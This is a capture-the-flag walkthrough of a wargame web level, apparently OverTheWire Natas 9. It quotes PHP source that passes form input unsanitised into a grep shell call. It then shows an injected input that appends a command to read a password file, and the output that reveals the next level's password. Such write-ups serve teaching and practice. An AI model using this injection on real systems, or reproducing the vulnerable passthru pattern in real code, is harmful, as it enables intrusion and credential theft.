This time we are given an input field with instructions "Find words containing", along with an (empty) output field at the bottom. Let's try some dummy input:

**`Find words containing: random`**  
```
Output:

random
randomly
randomness
randomness's
```

We are also given a link to the sourcecode again, so let's take a look at a snippet of that:

```
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

Upon closer examination of the `passthru()` function, it essentially takes our input, assigns that to the value of a variable `$key`, and then references `$key` in a command that searches through a file `dictionary.txt` using `grep`. We've played around with command injection vulnerabilities before in Leviathan; essentially, we can trick `passthru()` into accepting our input, which has been manipulated to include a bash command, forcing it to run whatever bash command we append to our input. Given our knowledge of where the passwords are stored:

**`Find words containing: random;cat /etc/natas_webpass/natas10`**  
```
Output:

D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

African
Africans
Allah
Allah's
American
...
...
```
